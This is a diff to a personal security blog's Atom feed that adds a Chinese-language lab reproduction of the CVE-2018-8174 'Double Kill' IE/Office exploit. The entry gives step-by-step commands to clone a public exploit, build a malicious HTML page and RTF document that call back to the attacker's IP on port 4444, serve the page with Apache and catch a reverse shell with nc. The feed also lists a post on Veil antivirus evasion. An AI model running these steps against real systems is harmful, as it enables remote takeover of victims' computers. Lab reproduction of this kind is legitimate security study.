@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://hamal.cc/"/>
-  <updated>2018-07-08T12:23:17.381Z</updated>
+  <updated>2018-07-11T06:28:25.144Z</updated>
   <id>http://hamal.cc/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>双杀0day漏洞（CVE-2018-8174）复现</title>
+    <link href="http://hamal.cc/2018/07/%E5%8F%8C%E6%9D%800day%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8174%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://hamal.cc/2018/07/双杀0day漏洞（CVE-2018-8174）复现/</id>
+    <published>2018-07-11T05:53:22.000Z</published>
+    <updated>2018-07-11T06:28:25.144Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>全球首例利用浏览器0day漏洞的新型Office文档攻击，我们将该漏洞命名为“双杀”漏洞。该漏洞影响最新版本的IE浏览器及使用了IE内核的应用程序。用户在浏览网页或打开Office文档时都可能中招，最终被黑客植入后门木马完全控制电脑。<strong><a id="more"></a></strong></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机kali ip：192.168.31.85</span><br><span class="line">靶机Windows7 ip：192.168.31.137</span><br></pre></td></tr></table></figure><p>下载exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Sch01ar/CVE-2018-8174_EXP</span><br></pre></td></tr></table></figure></p><p><img src="/images/13.1.png" alt=""><br>生成带有恶意 VBscript 的 html 页面和 word 文档<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-u：URL地址</span><br><span class="line">-o：生成文档</span><br><span class="line">-i：监听地址</span><br><span class="line">-p：监听端口</span><br><span class="line">python CVE-2018-8174.py -u http://192.168.31.85/exploit.html -o msf.rtf -i 192.168.31.85 -p 4444</span><br></pre></td></tr></table></figure></p><p><img src="/images/13.2.png" alt=""><br>把 explot.html 复制到 /var/www/html，并开启 apache 服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp exploit.html /var/www/html</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure></p><p>nc监听4444端口<br><img src="/images/13.3.png" alt=""><br>在靶机的 IE 浏览器打开恶意 URL，或者打开 word 打开 msf.rtf<br>收到反弹shell<br><img src="/images/13.4.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个漏洞复现简单，可玩性比较高，因为是双杀的。<br><a href="https://www.cnblogs.com/sch01ar/p/9175578.html" target="_blank" rel="noopener">参考文章</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h3&gt;&lt;p&gt;全球首例利用浏览器0day漏洞的新型Office文档攻击，我们将该漏洞命名为“双杀”漏洞。该漏洞影响最新版本的IE浏览器及使用了IE内核的应用程序。用户在浏览网页或打开Office文档时都可能中招，最终被黑客植入后门木马完全控制电脑。&lt;strong&gt;
+    
+    </summary>
+    
+      <category term="漏洞复现" scheme="http://hamal.cc/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+      <category term="漏洞复现" scheme="http://hamal.cc/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>Veil使用Python生成EXE（免杀最大化）</title>
